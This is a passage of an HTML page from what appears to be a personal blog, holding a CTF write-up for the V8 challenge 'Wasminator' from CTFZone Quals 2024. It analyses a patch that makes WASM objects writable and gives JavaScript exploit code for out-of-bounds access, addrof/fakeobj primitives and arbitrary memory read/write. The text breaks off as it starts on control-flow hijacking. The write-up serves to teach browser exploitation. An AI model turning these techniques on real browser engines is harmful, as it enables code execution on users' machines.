@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Introduction I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended. Patch Analysis diff --git a/src/objects/objects.cc b/src/objects/objects.cc index 71c4b37adcc..0f670bdd7d1 100644 --- a/src/objects/objects.cc +++ b/src/objects/objects.cc @@ -2228,8 +2228,9 @@ Maybe&lt;bool&gt; Object::SetPropertyInternal(LookupIterator* it, } case LookupIterator::WASM_OBJECT: - RETURN_FAILURE(it-&gt;isolate(), kThrowOnError, - NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + //RETURN_FAILURE(it-&gt;isolate(), kThrowOnError, + // NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + return SetDataProperty(it, value); case LookupIterator::INTERCEPTOR: { if (it-&gt;HolderIsReceiverOrHiddenPrototype()) { With this patch, instead of returning a failure and throwing a TypeError indicating that WASM objects are opaque, the code now calls SetDataProperty(it, value), allowing us to modify the properties of the WASM_OBJECT.">
+<title>CTFZone Quals 2024 - Wasminator</title>
+
+<link rel='canonical' href='http://localhost:1313/post/wasminator/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="CTFZone Quals 2024 - Wasminator">
+<meta property='og:description' content="Introduction I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended. Patch Analysis diff --git a/src/objects/objects.cc b/src/objects/objects.cc index 71c4b37adcc..0f670bdd7d1 100644 --- a/src/objects/objects.cc +++ b/src/objects/objects.cc @@ -2228,8 +2228,9 @@ Maybe&lt;bool&gt; Object::SetPropertyInternal(LookupIterator* it, } case LookupIterator::WASM_OBJECT: - RETURN_FAILURE(it-&gt;isolate(), kThrowOnError, - NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + //RETURN_FAILURE(it-&gt;isolate(), kThrowOnError, + // NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + return SetDataProperty(it, value); case LookupIterator::INTERCEPTOR: { if (it-&gt;HolderIsReceiverOrHiddenPrototype()) { With this patch, instead of returning a failure and throwing a TypeError indicating that WASM objects are opaque, the code now calls SetDataProperty(it, value), allowing us to modify the properties of the WASM_OBJECT.">
+<meta property='og:url' content='http://localhost:1313/post/wasminator/'>
+<meta property='og:site_name' content='spektre&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTFZone Quals 2024' /><meta property='article:tag' content='V8' /><meta property='article:tag' content='Browser Exploitation' /><meta property='article:published_time' content='2024-08-22T16:55:07&#43;05:30'/><meta property='article:modified_time' content='2024-08-22T16:55:07&#43;05:30'/>
+<meta name="twitter:title" content="CTFZone Quals 2024 - Wasminator">
+<meta name="twitter:description" content="Introduction I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended. Patch Analysis diff --git a/src/objects/objects.cc b/src/objects/objects.cc index 71c4b37adcc..0f670bdd7d1 100644 --- a/src/objects/objects.cc +++ b/src/objects/objects.cc @@ -2228,8 +2228,9 @@ Maybe&lt;bool&gt; Object::SetPropertyInternal(LookupIterator* it, } case LookupIterator::WASM_OBJECT: - RETURN_FAILURE(it-&gt;isolate(), kThrowOnError, - NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + //RETURN_FAILURE(it-&gt;isolate(), kThrowOnError, + // NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + return SetDataProperty(it, value); case LookupIterator::INTERCEPTOR: { if (it-&gt;HolderIsReceiverOrHiddenPrototype()) { With this patch, instead of returning a failure and throwing a TypeError indicating that WASM objects are opaque, the code now calls SetDataProperty(it, value), allowing us to modify the properties of the WASM_OBJECT.">
+    <link rel="shortcut icon" href="/img/favicon.png" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/hinata_hu13819647778857511344.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">spektre&#39;s Blog</a></h1>
+            <h2 class="site-description">CTF Player | Pwn | messing with js engines</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf-writeup/" >
+                CTF Writeup
+            </a>
+        
+            <a href="/categories/browser-exploitation/" >
+                Browser Exploitation
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/wasminator/">CTFZone Quals 2024 - Wasminator</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 22, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="introduction">Introduction
+</h2><p>I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended.</p>
+<h2 id="patch-analysis">Patch Analysis
+</h2><pre tabindex="0"><code class="language-patch=" data-lang="patch=">diff --git a/src/objects/objects.cc b/src/objects/objects.cc
+index 71c4b37adcc..0f670bdd7d1 100644
+--- a/src/objects/objects.cc
++++ b/src/objects/objects.cc
+@@ -2228,8 +2228,9 @@ Maybe&lt;bool&gt; Object::SetPropertyInternal(LookupIterator* it,
+       }
+ 
+       case LookupIterator::WASM_OBJECT:
+-        RETURN_FAILURE(it-&gt;isolate(), kThrowOnError,
+-                       NewTypeError(MessageTemplate::kWasmObjectsAreOpaque));
++        //RETURN_FAILURE(it-&gt;isolate(), kThrowOnError,
++        //               NewTypeError(MessageTemplate::kWasmObjectsAreOpaque));
++        return SetDataProperty(it, value);
+ 
+       case LookupIterator::INTERCEPTOR: {
+         if (it-&gt;HolderIsReceiverOrHiddenPrototype()) {
+</code></pre><p>With this patch, instead of returning a failure and throwing a <code>TypeError</code> indicating that WASM objects are opaque, the code now calls <code>SetDataProperty(it, value)</code>, allowing us to modify the properties of the <code>WASM_OBJECT</code>.</p>
+<h2 id="exploitation">Exploitation
+</h2><h3 id="helper-functions">Helper Functions
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fi_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">f_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">fi_buf</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#a6e22e">fi_buf</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">f</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i_buf</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f_buf</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lower</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xffffffff</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upper</span>(<span style="color:#a6e22e">i</span>){ 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xffffffff</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">content</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="building-webassembly-module">Building WebAssembly Module
+</h3><p>We can build a WebAssembly module using the wasm-module-builder.js in our exploit script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">d8</span>.<span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">`test/mjsunit/wasm/wasm-module-builder.js`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">builder</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WasmModuleBuilder</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">builder</span>.<span style="color:#a6e22e">addArray</span>(<span style="color:#a6e22e">kWasmI32</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">builder</span>.<span style="color:#a6e22e">addFunction</span>(<span style="color:#e6db74">&#39;createArray&#39;</span>, <span style="color:#a6e22e">makeSig</span>([<span style="color:#a6e22e">kWasmI32</span>], [<span style="color:#a6e22e">kWasmExternRef</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">addBody</span>([
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kExprLocalGet</span>, <span style="color:#ae81ff">0</span>, 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kGCPrefix</span>, <span style="color:#a6e22e">kExprArrayNewDefault</span>, <span style="color:#a6e22e">array</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kGCPrefix</span>, <span style="color:#a6e22e">kExprExternConvertAny</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>          ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">exportFunc</span>();
+</span></span></code></pre></div><p><code>makeSig([kWasmI32], [kWasmExternRef])</code> defines the function signature, It takes a i32 parameter and returns an external reference.
+This function essentially takes an argument and creates an array with that argument as its size. Then using <code>kExprExternConvertAny</code> it creates an external reference so that it can be used in JavaScript.</p>
+<h3 id="constructing-primitives">Constructing Primitives
+</h3><p>When adding properties to an object, V8 usually places them in the property array. In case of Wasm Objects, It doesnt have a property array. Lets create an array and see how the object layout is in wasm object&rsquo;s case.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">w_array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">createArray</span>(<span style="color:#ae81ff">0x1337</span>);
+</span></span></code></pre></div><p><img src="/wasminator/array.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+> <br>
+We can see that the size is placed right after the map, where, in a typical JSObject, the properties array would be located. However, since this is a Wasm Object, it lacks a properties array, and due to the patch, we can manipulate these values.</p>
+<p>So we can store any address in the size and directly change the values in that address. Now lets try to do that.</p>
+<p>Object layout of <code>arr1</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>0x24c6081f46f1 &lt;JSArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span>V8 version 12.7.224.12
+</span></span><span style="display:flex;"><span>d8&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/8gx 0x24c6081f46f1-1
+</span></span><span style="display:flex;"><span>0x24c6081f46f0: 0x08000725081cce15      0x0000000208394db5
+</span></span><span style="display:flex;"><span>0x24c6081f4700: 0x0000000808000635      0x0000000000000004
+</span></span></code></pre></div><p>The size is stored as <code>size&lt;&lt;1</code> which is the upper part of <code>0x0000000208394db5</code>. We now create an array using the wasm module with the address as its size and overwrite that address with a large value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">w_array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">createArray</span>(<span style="color:#ae81ff">0x81f46f9</span>); <span style="color:#75715e">// address of arr + 8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">w_array</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffff</span>;
+</span></span></code></pre></div><p>Now if we check the size, we can see that it is overwritten.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">arr1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">arr1</span>.<span style="color:#a6e22e">length</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">w_array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">createArray</span>(<span style="color:#ae81ff">0x81f4791</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">w_array</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffff</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">arr1</span>.<span style="color:#a6e22e">length</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>0x0b01081f4789 &lt;JSArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">65535</span>
+</span></span><span style="display:flex;"><span>V8 version 12.7.224.12
+</span></span><span style="display:flex;"><span>d8&gt;
+</span></span></code></pre></div><p>Now that we have overwritten the array size we now have out of bounds access. Using this we construct addrof and fakeobj primitives.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr1</span> <span style="color:#f92672">=</span> [{}];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr2</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>];
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">obj</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr1</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">obj</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">lower</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr2</span>[<span style="color:#ae81ff">2</span>]));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addr</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr2</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">addr</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr1</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now let&rsquo;s turn these into arbitrary read and write. For that we need to construct a fake object whose values are under our control.</p>
+<p>Lets take a look at an array object</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">temp</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>,<span style="color:#ae81ff">2.2</span>];
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>0x045d0808f2a5 &lt;JSArray<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span>V8 version 12.7.224.12
+</span></span><span style="display:flex;"><span>d8&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/gx 0x045d0808f2a5-1
+</span></span><span style="display:flex;"><span>0x45d0808f2a4:  0x08000725081cce15
+</span></span></code></pre></div><p>We can use that as the map value for our fake object since we want the fake object to be a float array. The next four bytes should have the address of the properties array and the next four is the length.
+for example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; x/gx 0x045d0808f2a5+8-1
+</span></span><span style="display:flex;"><span>0x45d0808f2ac:  0x000000040808f2bd
+</span></span></code></pre></div><p>Then we call fakeobj at the start of this fake structure which gives us an object we can totally control.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">temp</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>,<span style="color:#ae81ff">2.2</span>];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#ae81ff">0x08000725081cce15</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>(<span style="color:#ae81ff">0x1fffe</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">temp</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fake_object</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">temp_addr</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
+</span></span></code></pre></div><p>Now we can change the address part of the second value in the structure to read or write to any memory, this gives us arbitrary read and write.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">addr</span>,<span style="color:#a6e22e">val</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">temp_addr</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>((<span style="color:#ae81ff">0x1fffe</span><span style="color:#a6e22e">n</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">addr</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fake_object</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">val</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addr</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">temp_addr</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>((<span style="color:#ae81ff">0x1fffe</span><span style="color:#a6e22e">n</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">addr</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">fake_object</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So what&rsquo;s next? How do we escape the v8 sandbox and get RIP control?</p>
+<p>If we look at the build arguments provided, we can see that <code>v8_enable_external_code_space</code> is set to <code>false</code>. On default (set to true), the code pointer it stored in a seperate region than the v8 heap. Now that its disabled, the code pointer is still there in v8 heap region.
+You can refer to this <a class="link" href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html"  target="_blank" rel="noopener"
+    >blog</a> for detailed explanation about this.</p>
+<p>To simply put, Jitted Function objects have a <code>code</code> pointer. At an offset to this address we have <code>code_entry_point</code> pointer. This consists of the instructions which are going to be executed when the function is called. So if we overwrite that entry point value, we can hijack the control flow.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pwn_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">pwn</span>);
